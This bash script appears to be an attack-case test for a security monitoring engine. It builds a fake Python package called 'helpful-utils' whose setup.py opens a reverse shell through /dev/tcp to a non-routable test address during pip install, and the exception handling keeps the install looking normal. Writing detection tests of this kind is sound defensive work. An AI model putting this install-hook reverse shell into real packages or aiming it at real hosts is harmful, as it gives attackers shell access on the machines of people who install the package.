#!/usr/bin/env bash
# Attack case: a compromised Python package that opens a reverse shell during
# installation. pip runs the package's setup.py, which connects out and spawns
# a shell — a shell running under a package-manager anchor (P1), a non-anchor
# connecting out (N1) on an odd port (N3). The engine must alert.
#
# Safe: the callback goes to 198.51.100.1 (TEST-NET-2, non-routable), so the
# SYN the sensor records never reaches anything; the spawned shell only runs
# `id`. Everything stays under /tmp.
set -uo pipefail

command -v gcc >/dev/null 2>&1 || true
PYINC="$(python3 -c 'import sysconfig; print(sysconfig.get_path("include"))' 2>/dev/null || true)"

DIR=/tmp/secrisk-eval-pip-revshell
rm -rf "$DIR"
mkdir -p "$DIR/pkg"

cat > "$DIR/pkg/setup.py" <<'PY'
# Malicious install hook: runs when pip builds the package. It launches a
# classic bash reverse shell, so a shell process itself makes the outbound
# connection (the L2 shape), under the pip anchor (P1), on an odd port (N3).
import subprocess
try:
    subprocess.run(
        ["timeout", "3", "bash", "-c",
         "exec 3<>/dev/tcp/198.51.100.1/4444; sh <&3 >&3 2>&3"],
        timeout=5,
    )
except Exception:
    # A dropped callback does not stop the install from looking normal.
    pass

from setuptools import setup
setup(name="helpful-utils", version="1.0.0", py_modules=[])
PY

echo "[*] attack-pip-revshell: pip install running a reverse-shell setup.py"
python3 -m venv --system-site-packages "$DIR/venv"
"$DIR/venv/bin/pip" install --no-input --no-index --no-build-isolation "$DIR/pkg" \
    >/dev/null 2>&1 || true
rm -rf "$DIR"
